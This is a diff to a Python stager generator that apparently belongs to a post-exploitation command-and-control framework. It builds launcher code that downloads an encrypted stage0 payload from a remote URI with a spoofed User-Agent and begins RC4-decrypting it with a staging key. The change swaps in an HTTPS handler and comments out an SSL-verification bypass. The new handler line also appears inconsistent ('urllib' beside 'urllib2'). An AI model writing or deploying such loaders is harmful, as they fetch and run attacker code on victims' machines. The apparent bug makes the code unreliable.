@@ -234,10 +234,15 @@ class Stagers:
 
         # first line of randomized text to change up the ending RC4 string
         launcherBase = "%s='%s'\n" % (helpers.random_string(), helpers.random_string())
+        
+        # handler to use - http or https
+        handler = "urllib2.HTTPHandler()"
 
         if "https" in stage0uri:
             # monkey patch ssl woohooo
-            launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"
+            launcherBase += "import ssl;\n"
+            # launcherBase += "if hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"
+            handler = "urllib.HTTPSHandler()"
 
         launcherBase += "import sys, urllib2;"
         try:
@@ -254,11 +259,12 @@ class Stagers:
             print helpers.color(p, color="Yellow")
 
         
-        launcherBase += "o=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['build_opener']).build_opener();\n"
-        launcherBase += "UA='%s';\n" % (userAgent)
-        launcherBase += "o.addheaders=[('User-Agent',UA)];\n"
-        launcherBase += "a=o.open('%s').read();\n" % (stage0uri)
-        launcherBase += "key='%s';\n" % (stagingKey)
+        launcherBase += "o=urllib2.build_opener()\n"
+        launcherBase += "o.addHandler(" + handler + ")\n"
+        launcherBase += "UA='%s'\n" % (userAgent)
+        launcherBase += "o.addheaders=[('User-Agent',UA)]\n"
+        launcherBase += "a=o.open('%s').read()\n" % (stage0uri)
+        launcherBase += "key='%s'\n" % (stagingKey)
         # RC4 decryption
         launcherBase += "S,j,out=range(256),0,[]\n"
         launcherBase += "for i in range(256):\n"
